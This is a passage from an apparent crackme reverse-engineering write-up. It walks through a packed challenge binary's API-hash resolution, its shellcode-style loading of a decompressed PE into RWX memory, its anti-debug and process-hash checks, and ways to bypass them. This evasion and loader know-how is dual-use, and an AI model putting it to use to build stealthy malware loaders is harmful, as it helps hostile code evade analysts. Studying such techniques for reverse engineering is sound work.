<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func_hash</span><span class="p">(</span><span class="n">func_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span> <span class="o">=</span> <span class="mh">0xf00df00d</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">func_name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">h</span> <span class="o">=</span> <span class="p">((</span><span class="n">h</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span> <span class="o">|</span> <span class="n">h</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">h</span>
</span></span></code></pre></div><p>In our case, there&rsquo;s only a pair of such calls, so we can just go with dynamic analysis instead.</p>
<p>Inside this function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">// do something with a buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_4011D0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_414000</span><span class="p">,</span> <span class="mi">160345</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">320690</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size</span><span class="p">)</span> <span class="p">)</span>
</span></span></code></pre></div><p>there&rsquo;s such call:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">   <span class="n">function_pointer</span> <span class="o">=</span> <span class="n">get_function_by_hash</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mh">0x3AC473D1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">function_pointer</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">function_pointer</span><span class="p">(</span><span class="mi">258</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a5</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><img src="24-l2-call_eax_01.png" alt="call eax 1"></p>
<p>and inside the main function as first identified:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"> <span class="c1">// somehow get a function pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">function_pointer</span> <span class="o">=</span> <span class="n">get_function_by_hash</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mh">0xF4DD3DAD</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// execute this function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v10</span> <span class="o">=</span> <span class="n">function_pointer</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mh">0x103000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
</span></span></code></pre></div><p><img src="24-l2-call_eax_02.png" alt="call eax 2"></p>
<p>So let&rsquo;s run <code>level2.exe</code> in x32dbg and hope we&rsquo;ll not get caught by some antidebug trick at this stage.
The goal is here is to break after the calls to <code>get_func_by_hash</code> and examine EAX, which should contain the address of the resolved API function.</p>
<p>The first call resolves to <code>RtlDecompressBuffer</code></p>
<p><img src="25-l2-resolved_call_1.png" alt="first call"></p>
<p>The 2nd call to <code>NtAllocateVirtualMemory</code></p>
<p><img src="25-l2-resolved_call_2.png" alt="second call"></p>
<p>We can even verify our reversed hash function:</p>
<pre tabindex="0"><code>&gt;&gt;&gt; hex(func_hash(&#34;RtlDecompressBuffer&#34;))
&#39;0x3ac473d1&#39;
&gt;&gt;&gt; hex(func_hash(&#34;NtAllocateVirtualMemory&#34;))
&#39;0xf4dd3dad&#39;
</code></pre><p>If we put all the pieces together, the main function:</p>
<ul>
<li>decompresses a buffer</li>
<li>reserves a new memory region with RWX permissions (0x40)</li>
<li>copies the uncompress buffer to this region</li>
<li>transfers execution in there</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">UncompressedBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">320690u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">decompress_buffer</span><span class="p">(</span><span class="n">CompressedBuffer</span><span class="p">,</span> <span class="mi">160345</span><span class="p">,</span> <span class="n">UncompressedBuffer</span><span class="p">,</span> <span class="mi">320690</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FinalUncompressedSize</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FinalUncompressedSize</span><span class="p">,</span> <span class="mh">0x103000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">memmove</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">UncompressedBuffer</span><span class="p">,</span> <span class="n">FinalUncompressedSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span><span class="p">();</span>
</span></span></code></pre></div><h3 id="23-unpacking-the-2nd-stage">2.3 Unpacking the 2nd stage</h3>
<p>In order to unpack the second stage, we can break right before the control flow is transfered to the shellcode:</p>
<p><img src="26-l2-break_at_shellcode_exec.png" alt="break at shellcode"></p>
<p>if we inspect the memory at <code>shellcode</code> address, we notice that it starts with the magic <code>MZ</code> bytes and that there&rsquo;s something which looks like a DOS stub, so it seems we&rsquo;re getting a another PE file.</p>
<p>From here we can right click on the shellcode address, select <code>follow in memory map</code></p>
<p><img src="27-l2-follow_in_memory_map.png" alt="follow in memory map">
then <code>dump memory to file</code></p>
<p><img src="28-l2-dump_to_file.png" alt="dump to file"></p>
<p>The resulting file seems to be a valid PE:</p>
<p><img src="29-l2_dumped_pe.png" alt="dumped PE file"></p>
<h3 id="24-bonus-pe-to-shellcode">2.4 Bonus: PE to Shellcode</h3>
<p>It&rsquo;s interesting to note that the 2nd stage payload we dumped is a PE file, however execution is directly transfered to it, like it would be with a shellcode, not with a PE.</p>
<p>It is normally not possible because a PE file must first go through a loader which will map memory, apply relocations etc&hellip; the executable code is not starting at offset 0.</p>
<p>However the PE header have been modified so it can actually be executed.
The <code>CALL EBX</code> jumps to a piece of code handling the relocations before transfering execution to the original PE entry point:</p>
<p><img src="31-l2-modified_pe_header.png" alt="modified pe header"></p>
<p>as compared to a normal PE header:</p>
<p><img src="30-l2-typical_pe_header.png" alt="typical pe header"></p>
<p>I suspect it&rsquo;s the work of Hasherezade&rsquo;s <a href="https://github.com/hasherezade/pe_to_shellcode">PE to Shellcode</a>, the loader looks similar to <a href="https://github.com/hasherezade/pe_to_shellcode/blob/master/hldr32/hldr32.asm">this</a>.
Pretty neat trick.</p>
<h3 id="25-analyzing-the-2nd-stage">2.5 Analyzing the 2nd stage</h3>
<p>Let&rsquo;s now have a look at the dumped content.
<em>I will only mostly use already cleaned code from here.</em></p>
<p>Again we can navigate from the entry point down to the main function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">dbg_check</span><span class="p">;</span> <span class="c1">// edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="k">operator</span> <span class="k">new</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dbg_check</span> <span class="o">=</span> <span class="n">initialize_hashes_and_check_for_debugger</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="n">dbg_check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">dbg_check</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">stage2_and_3_lets_go</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">crackme_pipe&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__free</span><span class="p">(</span><span class="n">dbg_check</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Seeing the string <code>&quot;\\\\.\\pipe\\crackme_pipe&quot;</code> we know we&rsquo;re on the right track, but let&rsquo;s start with the first function call</p>
<h3 id="26-anti-debug">2.6 Anti debug</h3>
<p>The first function is responsible for initializing a list of hashes and performing some antidebug checks:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">__thiscall</span> <span class="nf">initialize_hashes_and_check_for_debugger</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="k">this</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">table_pointer</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">table_size</span><span class="p">;</span> <span class="c1">// edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+Ch] [ebp-98h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">_this</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-90h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">process_hash</span><span class="p">[</span><span class="mi">34</span><span class="p">];</span> <span class="c1">// [esp+18h] [ebp-8Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">_this</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">table_pointer</span> <span class="o">=</span> <span class="n">process_hash</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="n">table_size</span> <span class="o">=</span> <span class="mi">34</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xC81D63C9</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5B2839AC</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x17DAD73F</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x72C7241C</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x58E483ED</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x82134662</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34204667</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4CD53A71</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34206499</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFDEB191</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7AC6410B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xEA3503AA</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xCCFA2924</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3A09FFBC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x38EA0C1B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x58E479EC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1B964E1A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x707F9D9A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xF5A79701</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9F5473B</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xBA635AC6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xBB18A65</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x46119FD8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFB7BF6AF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3F75D54B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x49110E9F</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D9F9FD8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5DCC9FD8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8293C33E</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D112314</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9D9F8189</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xC10AE786</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x67D8B725</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7FE9020</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">initialize_hash_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_HASH_SET</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">table_pointer</span><span class="o">++</span><span class="p">,</span> <span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">--</span><span class="n">table_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">table_size</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">check_for_debuggers</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">||</span> <span class="n">kernel_mode_antidbg</span><span class="p">()</span> <span class="o">||</span> <span class="n">enumerate_process_and_hash</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_HASH_SET</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">__debugbreak</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">_this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>after the initization of a global hashes set, it will call 3 functions:</p>
<h4 id="261-check_for_debuggers">2.6.1 check_for_debuggers()</h4>
<p>this function uses the following API functions to check if the process is being debugged:</p>
<ul>
<li><code>IsDebuggerPresent()</code></li>
<li><code>CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;pbDebuggerPresent);</code></li>
</ul>
<h4 id="262-kernel_mode_antidbg">2.6.2 kernel_mode_antidbg()</h4>
<p>this function checks for a kernel debugger using</p>
<p><code>IsBadReadPtr(0x7FFE0000, 0x3B8u);</code></p>
<p>more info here: <a href="https://github.com/hasherezade/antianalysis_demos/blob/master/kernelmode_antidbg.cpp">https://github.com/hasherezade/antianalysis_demos/blob/master/kernelmode_antidbg.cpp</a></p>
<h4 id="263-enumerate_process_and_hash">2.6.3 enumerate_process_and_hash()</h4>
<p>This function takes 2 parameters: the list of hashes previously initialized and a bool.
It&rsquo;s using the combo <code>CreateToolhelp32Snapshot()</code>, <code>Process32First()</code>, <code>Process32Next()</code> to iterate over the list of running processes.</p>
<p>For each process, it gets the executable name, strips the trailing &ldquo;.exe&rdquo;, computes a hash and checks if the hash is part of the previously initialized list.</p>
<p>Since the bool parameter we mentionned earlier is set to 1, the hash is computed on the lower case version of the executable name (making it case insensitive).</p>
<p>The hash is calculated in this way:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mh">0xbadc0ffe</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="p">((</span><span class="n">key</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span> <span class="o">|</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span>
</span></span></code></pre></div><p>we remember that if <code>procmon</code> was running the crackme detected it, so let&rsquo;s perform a quick check:</p>
<pre tabindex="0"><code>&gt;&gt;&gt; hex(hash(&#34;procmon&#34;))
&#39;0x34204667&#39;
</code></pre><p>we can indeed find this hash in the in list:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">process_hash</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34204667</span><span class="p">;</span>                 <span class="c1">// procmon
</span></span></span></code></pre></div><p>So far so good&hellip; we&rsquo;ll come back to these hashes later on.</p>
<h4 id="264-handling">2.6.4 Handling</h4>
<p>If any of these checks fail, the binary will call <code>__debugbreak()</code> - generating a software breakpoint which will either be caught by the debugger - if any and be harmless, or by the Vectored Exception Handler registered before the unpacking of the 2nd stage.</p>
<p>The handler looks like this, and will exit the process with -1 in case there&rsquo;s a (uncaught) breakpoint happening within the stage 2 payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">LONG</span> <span class="kr">__stdcall</span> <span class="nf">Handler</span><span class="p">(</span><span class="k">struct</span> <span class="nc">_EXCEPTION_POINTERS</span> <span class="o">*</span><span class="n">ExceptionInfo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span> <span class="n">exception_code</span><span class="p">;</span> <span class="c1">// ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">exception_address</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">exception_code</span> <span class="o">=</span> <span class="n">ExceptionInfo</span><span class="o">-&gt;</span><span class="n">ExceptionRecord</span><span class="o">-&gt;</span><span class="n">ExceptionCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">exception_address</span> <span class="o">=</span> <span class="n">ExceptionInfo</span><span class="o">-&gt;</span><span class="n">ExceptionRecord</span><span class="o">-&gt;</span><span class="n">ExceptionAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// // access violation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">exception_code</span> <span class="o">==</span> <span class="mh">0xC0000005</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">MessageBoxA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Failed!&#34;</span><span class="p">,</span> <span class="s">&#34;ERROR&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ExitProcess</span><span class="p">(</span><span class="o">-</span><span class="mi">2u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// exception happened when executing the shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// and the code was 0x80000003 (breakpoint)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="n">FinalUncompressedSize</span>
</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="n">exception_address</span> <span class="o">&gt;=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="n">exception_address</span> <span class="o">&lt;</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">FinalUncompressedSize</span>
</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="n">exception_code</span> <span class="o">==</span> <span class="mh">0x80000003</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ExitProcess</span><span class="p">(</span><span class="o">-</span><span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If the program exits with -1, the frontend will catch it and display the popup we&rsquo;ve seen earlier about analysis tools:</p>
<p><img src="29-l2-exit_code_check.jpg" alt="anti analysis tools"></p>
<h3 id="27-bypassing-the-anti-debug">2.7 Bypassing the Anti debug</h3>
<p>There might be different ways to bypass these checks, among them:</p>
<ul>
<li>The first (two ?) checks can be bypassed using a x64dbg plugin like <code>ScyllaHide</code></li>
<li>The last one can be circumvent by renaming our analysis tools executables.</li>
<li>One could also use x64dbg to patch the checks (NOP them or make them always successfull), or manipulate registers/flags to achieve the same result, but i do not think this would be really practical as the shellcode will be loaded at a different address everytime and most likely the checks would have run already before we have a chance to attach it.</li>
<li>Maybe the VEH in level2.exe could be patched to do nothing instead of exiting ?</li>
</ul>
